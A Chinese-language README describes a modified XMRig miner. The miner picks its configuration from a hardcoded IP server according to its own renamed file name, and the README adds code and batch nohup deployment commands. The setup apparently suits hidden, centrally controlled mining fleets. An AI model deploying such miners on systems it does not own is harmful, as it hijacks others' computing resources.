# XMRig 动态程序名配置功能

## 🎯 功能说明

程序现在可以**根据自身的可执行文件名**自动从服务器获取对应的配置文件。

### 核心特性

✅ **智能识别** - 自动识别程序文件名  
✅ **动态配置** - 根据文件名构建配置URL  
✅ **自动去除扩展名** - 支持.exe、.bin等各种扩展名  
✅ **默认回退** - xmrig默认使用666配置  

## 📐 配置规则

### URL生成规则
```
程序名 → http://182.92.97.16:8181/configs/{程序名}+cpu.json
```

### 具体示例

| 程序文件名 | 获取的配置URL |
|-----------|--------------|
| `666.exe` | `http://182.92.97.16:8181/configs/666+cpu.json` |
| `test.exe` | `http://182.92.97.16:8181/configs/test+cpu.json` |
| `worker1` | `http://182.92.97.16:8181/configs/worker1+cpu.json` |
| `myworker.bin` | `http://182.92.97.16:8181/configs/myworker+cpu.json` |
| `xmrig` | `http://182.92.97.16:8181/configs/666+cpu.json` (默认) |
| `xmrig.exe` | `http://182.92.97.16:8181/configs/666+cpu.json` (默认) |

## 🚀 使用方法

### 1. 重命名程序
```bash
# Linux/Mac
mv xmrig 666
mv xmrig test
mv xmrig worker1

# Windows
ren xmrig.exe 666.exe
ren xmrig.exe test.exe
ren xmrig.exe worker1.exe
```

### 2. 直接运行
```bash
# 运行666 → 自动获取666+cpu.json
./666

# 运行test → 自动获取test+cpu.json
./test

# 运行worker1 → 自动获取worker1+cpu.json
./worker1
```

## 📊 测试验证

### 测试结果
```bash
# 测试1: 程序名为666
./666 --dry-run
→ Using web configuration URL based on executable name '666': 
  http://182.92.97.16:8181/configs/666+cpu.json

# 测试2: 程序名为test
./test --dry-run
→ Using web configuration URL based on executable name 'test': 
  http://182.92.97.16:8181/configs/test+cpu.json

# 测试3: 程序名为myworker.exe
./myworker.exe --dry-run
→ Using web configuration URL based on executable name 'myworker': 
  http://182.92.97.16:8181/configs/myworker+cpu.json
```

## 🔧 技术实现

### 代码位置
`src/core/config/Config.cpp` - `loadWebConfig()` 方法

### 实现逻辑
1. 获取程序完整路径 (`Process::exepath()`)
2. 提取文件名（去除路径）
3. 移除扩展名（.exe, .bin等）
4. 如果是xmrig，使用666作为默认
5. 构建配置URL：`http://182.92.97.16:8181/configs/{name}+cpu.json`

### 关键代码
```cpp
// 获取程序的完整路径
String execPath = Process::exepath();
std::string fullPath(execPath.data());

// 提取文件名（不含路径）
std::string execName = fullPath;
size_t lastSlash = fullPath.find_last_of("/\\");
if (lastSlash != std::string::npos) {
    execName = fullPath.substr(lastSlash + 1);
}

// 移除扩展名
size_t lastDot = execName.find_last_of(".");
if (lastDot != std::string::npos) {
    execName = execName.substr(0, lastDot);
}

// 构建配置URL
m_webConfigUrl = "http://182.92.97.16:8181/configs/" + execName + "+cpu.json";
```

## 💡 应用场景

### 1. 多矿工管理
```bash
# 不同的矿工使用不同的配置
cp xmrig worker1  # 矿工1
cp xmrig worker2  # 矿工2
cp xmrig worker3  # 矿工3

# 每个矿工自动获取自己的配置
./worker1  # 获取worker1+cpu.json
./worker2  # 获取worker2+cpu.json
./worker3  # 获取worker3+cpu.json
```

### 2. 测试环境
```bash
# 测试配置
cp xmrig test
./test  # 获取test+cpu.json

# 生产配置
cp xmrig production
./production  # 获取production+cpu.json
```

### 3. 批量部署
```bash
# 批量部署脚本
for i in {1..10}; do
    cp xmrig "worker$i"
    nohup "./worker$i" > "worker$i.log" 2>&1 &
done
```

## 📝 服务器端配置

在服务器上为每个程序名准备对应的JSON配置文件：

```
http://182.92.97.16:8181/configs/
├── 666+cpu.json        # 默认配置
├── test+cpu.json       # 测试配置
├── worker1+cpu.json    # 矿工1配置
├── worker2+cpu.json    # 矿工2配置
└── production+cpu.json # 生产配置
```

每个配置文件可以有不同的：
- 矿池地址
- 钱包地址
- CPU使用率
- 监控参数
- 其他设置

## ✅ 优势

1. **灵活管理** - 一个程序，多种配置
2. **集中控制** - 服务器端统一管理所有配置
3. **快速切换** - 只需重命名程序即可切换配置
4. **批量部署** - 适合大规模部署场景
5. **零配置** - 无需本地配置文件

## 🎯 总结

现在XMRig可以：
- **根据程序名自动选择配置**
- **无需任何本地配置文件**
- **无需任何命令行参数**
- **支持批量部署不同配置**

只需：
1. 重命名程序为想要的名字
2. 运行程序
3. 自动获取对应配置并开始工作